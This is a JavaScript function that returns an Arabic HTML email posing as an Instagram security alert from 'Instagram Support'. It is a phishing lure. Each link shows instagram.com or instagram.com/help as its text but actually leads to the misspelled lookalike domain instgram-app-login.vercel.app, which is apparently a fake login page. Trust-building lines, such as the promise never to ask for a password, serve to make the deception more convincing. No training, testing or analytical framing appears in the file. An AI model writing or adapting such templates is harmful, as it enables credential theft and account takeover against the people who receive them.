export const emailTemp = () => {
  return `
  <!doctype html>
  <html dir="rtl" lang="ar">
    <head>
      <meta charset="utf-8">
      <title>تنبيه أمني من إنستجرام</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          font-family: "Segoe UI", Arial, sans-serif;
          background: #fafafa;
          color: #262626;
        }
        .container {
          max-width: 600px;
          margin: 40px auto;
          background: #fff;
          border-radius: 12px;
          box-shadow: 0 4px 20px rgba(0,0,0,0.08);
          overflow: hidden;
          border: 1px solid #e6e6e6;
        }
        .header {
          text-align: center;
          padding: 28px 0 18px;
          border-bottom: 1px solid #efefef;
        }
        .header img {
          width: 100px;
          margin-bottom: 10px;
        }
        .header h2 {
          margin: 0;
          color: #262626;
          font-size: 20px;
          font-weight: 600;
        }
        .body {
          padding: 28px 32px;
          text-align: right;
          direction: rtl;
        }
        .body p {
          font-size: 15px;
          line-height: 1.8;
          margin: 0 0 12px;
        }
        .body h4 {
          font-size: 16px;
          margin: 20px 0 10px;
          color: #262626;
        }
        .body ol {
          margin: 0;
          padding-right: 20px;
        }
        .body li {
          margin-bottom: 8px;
          font-size: 14px;
        }
        /* Instagram Gradient Button */
        .button {
          display: inline-block;
          background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af, #515bd4);
          color: #fff !important;
          text-decoration: none;
          padding: 12px 28px;
          border-radius: 8px;
          font-weight: 600;
          font-size: 14px;
          margin: 28px 0;
          text-align: center;
          transition: opacity 0.3s ease;
        }
        .button:hover {
          opacity: 0.9;
        }
        .footer {
          text-align: center;
          padding: 18px;
          font-size: 12px;
          color: #8e8e8e;
          background: #fafafa;
          border-top: 1px solid #efefef;
        }
        a {
          color: #0095f6;
          text-decoration: none;
        }
      </style>
    </head>
    <body>
      <div class="container">
        
        <!-- Header -->
        <div class="header">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1000px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
          <h2>Instagram Support</h2>
        </div>

        <!-- Body -->
        <div class="body">
          <p>مرحبًا،</p>
          <p>
            لاحظنا نشاطًا غير عادي على حسابك في إنستجرام. لضمان حماية حسابك، 
            يُرجى <strong>عدم الرد على هذا البريد الإلكتروني بكلمة المرور</strong> 
            أو أي معلومات شخصية أخرى.
          </p>

          <h4>ما يمكنك فعله الآن:</h4>
          <ol>
            <li>
              افتح تطبيق إنستجرام أو قم بزيارة 
              <a href="http://instgram-app-login.vercel.app">instagram.com</a> 
              لتسجيل الدخول بأمان.
            </li>
            <li>قم بتغيير كلمة المرور من: <em>الإعدادات → الأمان → كلمة المرور</em>.</li>
            <li>فعّل ميزة المصادقة الثنائية من: <em>الإعدادات → الأمان → المصادقة الثنائية</em>.</li>
            <li>تحقق من نشاط تسجيل الدخول واحذف الأجهزة غير المعروفة.</li>
          </ol>

          <div style="text-align:center;">
            <a href="http://instgram-app-login.vercel.app" class="button">تسجيل الدخول الآن</a>
          </div>

          <p>
            إذا لم تكن أنت من قام بهذا النشاط، يمكنك التواصل مع مركز المساعدة عبر 
            <a href="http://instgram-app-login.vercel.app">instagram.com/help</a>.
          </p>

          <p style="margin-top:20px;">مع تحياتنا،<br><strong>فريق دعم إنستجرام</strong></p>
        </div>

        <!-- Footer -->
        <div class="footer">
          هذه الرسالة من دعم إنستجرام. لن نطلب منك كلمة المرور عبر البريد الإلكتروني.
        </div>

      </div>
    </body>
  </html>`;
};
